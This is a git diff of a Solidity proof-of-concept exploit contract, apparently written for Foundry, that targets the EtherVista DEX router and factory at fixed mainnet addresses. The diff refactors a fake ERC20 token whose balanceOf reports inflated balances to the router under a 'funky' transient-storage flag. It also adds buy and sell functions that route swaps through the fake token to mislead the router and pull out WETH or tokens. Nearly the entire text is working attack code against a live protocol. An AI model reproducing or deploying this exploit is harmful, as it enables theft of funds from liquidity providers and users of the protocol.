@@ -44,11 +44,20 @@ contract FakeToken is ERC20, Test {
     EtherVistaFactory constant FACTORY = EtherVistaFactory(0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4);
     ERC20 constant WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
+    uint256 constant FUNKY_SLOT = 0;
+    uint256 constant PRE_BALANCE_SLOT = 1;
 
-    uint256 beFunky = 0;
-    uint256 prebalance;
-    address pair;
+    address immutable pair;
+
     constructor() {
+        pair = FACTORY.getPair(address(this), address(WETH));
+    }
+
+    function initialize() external payable {
+        _approve(address(this), address(ROUTER), type(uint256).max);
+        _mint(address(this), 10 ether);
+
+        ROUTER.launch{value: 10}(address(this), 1e14, 0, 0, 0, 0, 0, 0, address(this));
     }
 
     function name() public pure override returns (string memory) {
@@ -60,74 +69,124 @@ contract FakeToken is ERC20, Test {
     }
 
     function balanceOf(address account) public view override returns (uint256) {
-        if (msg.sender == address(ROUTER) && beFunky == 1) {
+        uint256 _funky = funky();
+        if (msg.sender == address(ROUTER) && _funky == 1) {
             return 1e9 ether;
         }
-        if (WETH.balanceOf(address(pair)) < prebalance && prebalance > 0 && beFunky == 1) {
+
+        uint256 _preBalance = preBalance();
+        if (WETH.balanceOf(address(pair)) < _preBalance && _preBalance > 0 && _funky == 1) {
             return 1e9 ether;
         }
         return 1e14;
     }
 
     function transfer(address to, uint256 value) public override returns (bool) {
-        beFunky += 1;
-        if (beFunky == 1) {
-            prebalance = WETH.balanceOf(address(to));
-            console.log("prebalance", prebalance);
+        setFunky(funky() + 1);
+        if (funky() == 1) {
+            setPreBalance(WETH.balanceOf(address(to)));
+            console.log("prebalance", preBalance());
         }
         return super.transfer(to, value);
     }
-    // returns sorted token addresses, used to handle return values from pairs sorted in this order
-    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
-        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
-        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
-        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
-    }
 
-    // calculates the CREATE2 address for a pair without making any external calls
     function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
-        (address token0, address token1) = sortTokens(tokenA, tokenB);
-        pair = address(uint160(uint256(keccak256(abi.encodePacked(
-                hex'ff',
-                factory,
-                keccak256(abi.encodePacked(token0, token1)),
-                hex'e260b72768e8ec6814aa811c576f346d208ba00840f835949d65c6424ac80a8d' // init code hash
-            )))));
+        (tokenA, tokenB) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
+        pair = address(
+            uint160(
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            hex"ff",
+                            factory,
+                            keccak256(abi.encodePacked(tokenA, tokenB)),
+                            hex"e260b72768e8ec6814aa811c576f346d208ba00840f835949d65c6424ac80a8d" // init code hash
+                        )
+                    )
+                )
+            )
+        );
     }
 
-    function initialize() external payable {
-        _approve(address(this), address(ROUTER), type(uint256).max);
-        _mint(address(this), 10 ether);
-
-        ROUTER.launch{value: 10}(address(this), 1e14, 0, 0, 0, 0, 255, 255, address(this));
-
-        pair = FACTORY.getPair(address(this), address(WETH));
-    }
-
-
-    function buy(address token, uint256 minOut) external payable {
+    function buy(address token, uint256 minOut, uint256 deadline) external payable {
         address[] memory path = new address[](4);
         path[0] = address(WETH);
         path[1] = address(this);
         path[2] = address(WETH);
         path[3] = address(token);
 
-        uint256 preBalance = ERC20(token).balanceOf(msg.sender);
-        
+        uint256 beforeBalance = ERC20(token).balanceOf(msg.sender);
+
         bytes memory data = abi.encodeWithSelector(
-            ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
-            0,
-            path,
-            msg.sender,
-            block.timestamp
+            ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens.selector, 0, path, msg.sender, deadline
         );
 
-        (bool success, bytes memory returnData) = address(ROUTER).call{value: msg.value}(data);
+        (bool success,) = address(ROUTER).call{value: msg.value}(data);
         require(success, "Router call failed");
 
-        uint256 postBalance = ERC20(token).balanceOf(msg.sender);
-        require(postBalance > preBalance + minOut, "No enough tokens received");
+        uint256 afterBalance = ERC20(token).balanceOf(msg.sender);
+        require(afterBalance > beforeBalance + minOut, "No enough tokens received");
+
+        refundDust();
+    }
+
+    function sell(address token, uint256 amount, uint256 minOut, uint256 deadline) external payable {
+        address[] memory path = new address[](4);
+        path[0] = address(token);
+        path[1] = address(this);
+        path[2] = address(token);
+        path[3] = address(WETH);
+
+        uint256 beforeBalance = ERC20(token).balanceOf(msg.sender);
+
+        bytes memory data = abi.encodeWithSelector(
+            ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens.selector, amount, 0, path, msg.sender, deadline
+        );
+
+        (bool success,) = address(ROUTER).call(data);
+        require(success, "Router call failed");
+
+        uint256 afterBalance = ERC20(token).balanceOf(msg.sender);
+        require(afterBalance > beforeBalance + minOut, "No enough tokens received");
+
+        refundDust();
+    }
+
+    function fee() internal view returns (uint256) {
+        return ROUTER.usdcToEth(1);
     }
 
     receive() external payable {}
+
+    function refundDust() internal {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function funky() internal view returns (uint256) {
+        uint256 v;
+        assembly {
+            v := tload(FUNKY_SLOT)
+        }
+        return v;
+    }
+
+    function setFunky(uint256 v) internal {
+        assembly {
+            tstore(FUNKY_SLOT, v)
+        }
+    }
+
+    function preBalance() internal view returns (uint256) {
+        uint256 v;
+        assembly {
+            v := tload(PRE_BALANCE_SLOT)
+        }
+        return v;
+    }
+
+    function setPreBalance(uint256 v) internal {
+        assembly {
+            tstore(PRE_BALANCE_SLOT, v)
+        }
+    }
 }
